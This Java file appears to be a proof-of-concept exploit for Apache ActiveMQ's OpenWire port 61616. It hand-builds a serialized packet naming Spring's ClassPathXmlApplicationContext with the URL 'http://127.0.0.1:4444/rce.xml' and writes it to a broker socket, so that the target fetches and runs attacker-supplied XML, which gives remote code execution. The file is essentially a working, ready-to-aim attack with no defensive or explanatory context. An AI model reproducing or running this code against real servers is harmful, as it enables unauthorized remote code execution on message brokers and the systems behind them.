import java.io.*;
import java.net.Socket;

/**
 * @Author: r00t4dm
 * @Date: 2023/10/25 10:04 PM
 */
public class App2 {

    public static void main(String[] args) throws IOException {
        String ip = "127.0.0.1"; //服务器端ip地址
        int port = 61616; //端口号
        Socket sck = new Socket(ip, port);
        //2.传输内容
        DataOutputStream out = null;
        DataInputStream in = null;
        out = new DataOutputStream(new BufferedOutputStream(new
                FileOutputStream("test.txt")));
        out.writeInt(32);
        out.writeByte(31);
        out.writeInt(1);
        out.writeBoolean(true);
        out.writeInt(1);
        out.writeBoolean(true);
        out.writeBoolean(true);
        out.writeUTF("org.springframework.context.support.ClassPathXmlApplicationContext");
        out.writeBoolean(true);
        out.writeUTF("http://127.0.0.1:4444/rce.xml");
        out.close();
        in = new DataInputStream(new BufferedInputStream(new
                FileInputStream("test.txt")));
        OutputStream os = sck.getOutputStream(); //输出流
        int length = in.available();
        byte[] buf = new byte[length];
        in.readFully(buf);
        os.write(buf);
        in.close();
        sck.close();
    }
}
